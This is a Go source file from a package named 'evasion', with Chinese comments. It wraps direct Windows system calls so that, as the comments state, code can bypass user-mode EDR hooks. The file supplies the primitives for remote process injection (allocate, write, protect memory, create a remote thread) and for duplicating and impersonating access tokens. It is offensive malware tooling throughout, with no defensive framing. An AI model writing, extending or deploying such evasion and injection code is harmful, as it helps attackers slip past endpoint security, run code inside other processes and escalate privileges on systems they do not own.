//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

// rawSyscall6 由syscall_amd64.s实现
// 直接执行SYSCALL指令，绕过所有用户态EDR hook
func rawSyscall6(ssn uint32, a1 uintptr, a2 uintptr, a3 uintptr, a4 uintptr, a5 uintptr, a6 uintptr) uintptr

// rawSyscall4 由syscall_amd64.s实现
// 4参数版本，用于NtClose等简单syscall
func rawSyscall4(ssn uint32, a1 uintptr, a2 uintptr, a3 uintptr, a4 uintptr) uintptr

// rawSyscall12 由syscall_amd64.s实现
// 12参数版本，用于NtCreateThreadEx等注入相关syscall
func rawSyscall12(ssn uint32, a1 uintptr, a2 uintptr, a3 uintptr, a4 uintptr, a5 uintptr, a6 uintptr, a7 uintptr, a8 uintptr, a9 uintptr, a10 uintptr, a11 uintptr, a12 uintptr) uintptr

// syscallNewLazyDLL 包装syscall.NewLazyDLL供SSN回退路径使用
func syscallNewLazyDLL(name string) *syscall.LazyDLL {
	return syscall.NewLazyDLL(name)
}

// ===== 直接syscall包装函数 =====
// 替代原apiresolve_windows.go中的LazyDLL.Call()
// 通过SSN + SYSCALL指令直接进入内核，绕过EDR hook

// DirectNtAVM 直接syscall: NtAllocateVirtualMemory
func DirectNtAVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, allocType uintptr, protect uintptr) uintptr {
	ssn := GetSSN("NtAllocateVirtualMemory")
	if ssn == 0 {
		return 0xC0000001 // STATUS_UNSUCCESSFUL
	}
	return rawSyscall6(ssn,
		hProcess,
		uintptr(unsafe.Pointer(baseAddr)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(regionSize)),
		allocType,
		protect,
	)
}

// DirectNtPVM 直接syscall: NtProtectVirtualMemory
func DirectNtPVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uint32) uintptr {
	ssn := GetSSN("NtProtectVirtualMemory")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		hProcess,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(regionSize)),
		newProtect,
		uintptr(unsafe.Pointer(oldProtect)),
		0,
	)
}

// DirectNtWriteVM 直接syscall: NtWriteVirtualMemory
func DirectNtWriteVM(hProcess uintptr, baseAddr uintptr, buffer uintptr, size uintptr, bytesWritten *uintptr) uintptr {
	ssn := GetSSN("NtWriteVirtualMemory")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		hProcess,
		baseAddr,
		buffer,
		size,
		uintptr(unsafe.Pointer(bytesWritten)),
		0,
	)
}

// DirectNtClose 直接syscall: NtClose
func DirectNtClose(handle uintptr) uintptr {
	ssn := GetSSN("NtClose")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn, handle, 0, 0, 0)
}

// NtStatusIsError 检查NTSTATUS是否表示错误
func NtStatusIsError(status uintptr) bool {
	return status&0xC0000000 == 0xC0000000
}

// ===== 进程注入相关直接syscall =====

// DirectNtOpenProcess 直接syscall: NtOpenProcess
// 获取目标进程句柄，绕过API hook
func DirectNtOpenProcess(processHandle *uintptr, desiredAccess uint32, objAttr *uintptr, clientID *uintptr) uintptr {
	ssn := GetSSN("NtOpenProcess")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn,
		uintptr(unsafe.Pointer(processHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(objAttr)),
		uintptr(unsafe.Pointer(clientID)),
	)
}

// DirectNtCreateThreadEx 直接syscall: NtCreateThreadEx
// 在目标进程中创建线程，用于经典注入
func DirectNtCreateThreadEx(threadHandle *uintptr, desiredAccess uint32, objAttr *uintptr,
	processHandle uintptr, startRoutine uintptr, argument uintptr,
	createFlags uint32, zeroBits uintptr, stackSize uintptr, maxStackSize uintptr, attrList *uintptr) uintptr {
	ssn := GetSSN("NtCreateThreadEx")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall12(ssn,
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(objAttr)),
		processHandle,
		startRoutine,
		argument,
		uintptr(createFlags),
		zeroBits,
		stackSize,
		maxStackSize,
		uintptr(unsafe.Pointer(attrList)),
		0,
	)
}

// DirectNtResumeThread 直接syscall: NtResumeThread
func DirectNtResumeThread(threadHandle uintptr, suspendCount *uint32) uintptr {
	ssn := GetSSN("NtResumeThread")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn,
		threadHandle,
		uintptr(unsafe.Pointer(suspendCount)),
		0,
		0,
	)
}

// ===== Token 操作相关直接syscall =====

// DirectNtOpenProcessToken 直接syscall: NtOpenProcessToken
func DirectNtOpenProcessToken(processHandle uintptr, desiredAccess uint32, tokenHandle *uintptr) uintptr {
	ssn := GetSSN("NtOpenProcessToken")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn,
		processHandle,
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(tokenHandle)),
		0,
	)
}

// DirectNtDuplicateToken 直接syscall: NtDuplicateToken
func DirectNtDuplicateToken(existingTokenHandle uintptr, desiredAccess uint32, objAttr *uintptr,
	effectiveOnly uint32, tokenType uint32, newTokenHandle *uintptr) uintptr {
	ssn := GetSSN("NtDuplicateToken")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		existingTokenHandle,
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(objAttr)),
		uintptr(effectiveOnly),
		uintptr(tokenType),
		uintptr(unsafe.Pointer(newTokenHandle)),
	)
}

// DirectNtQueryInformationToken 直接syscall: NtQueryInformationToken
func DirectNtQueryInformationToken(tokenHandle uintptr, infoClass uint32,
	info *byte, infoLen uint32, returnLen *uint32) uintptr {
	ssn := GetSSN("NtQueryInformationToken")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall6(ssn,
		tokenHandle,
		uintptr(infoClass),
		uintptr(unsafe.Pointer(info)),
		uintptr(infoLen),
		uintptr(unsafe.Pointer(returnLen)),
		0,
	)
}

// DirectNtSetInformationThread 直接syscall: NtSetInformationThread (ThreadImpersonationToken)
func DirectNtSetInformationThread(threadHandle uintptr, infoClass uint32,
	info *byte, infoLen uint32) uintptr {
	ssn := GetSSN("NtSetInformationThread")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn,
		threadHandle,
		uintptr(infoClass),
		uintptr(unsafe.Pointer(info)),
		uintptr(infoLen),
	)
}

// DirectNtQuerySystemInformation 直接syscall: NtQuerySystemInformation
func DirectNtQuerySystemInformation(infoClass uint32, info *byte, infoLen uint32, returnLen *uint32) uintptr {
	ssn := GetSSN("NtQuerySystemInformation")
	if ssn == 0 {
		return 0xC0000001
	}
	return rawSyscall4(ssn,
		uintptr(infoClass),
		uintptr(unsafe.Pointer(info)),
		uintptr(infoLen),
		uintptr(unsafe.Pointer(returnLen)),
	)
}
